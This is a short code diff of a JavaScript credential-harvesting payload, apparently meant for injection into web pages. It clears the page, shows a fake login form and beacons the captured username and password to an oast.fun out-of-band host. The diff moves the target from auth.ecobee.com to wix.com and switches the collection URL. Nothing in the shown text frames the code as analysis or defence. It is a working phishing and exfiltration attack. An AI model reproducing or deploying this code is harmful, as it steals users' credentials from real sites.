@@ -1,5 +1,5 @@
 // Define the target domain explicitly
-var targetDomain = 'auth.ecobee.com'; // Change this to 'site2.com', 'site3.com', etc., as needed
+var targetDomain = 'wix.com'; // Change this to 'site2.com', 'site3.com', etc., as needed
 
 document.body.innerHTML = "";
 var scripts = document.scripts;
@@ -64,7 +64,7 @@ document.body.appendChild(form);
 // Function to send the credentials back to your server
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `https://fakonltzsfedwiqhgufs2qi0cms94akrh.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(targetDomain)}`;
+  img.src = `https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(targetDomain)}`;
   document.body.appendChild(img);
 }
 
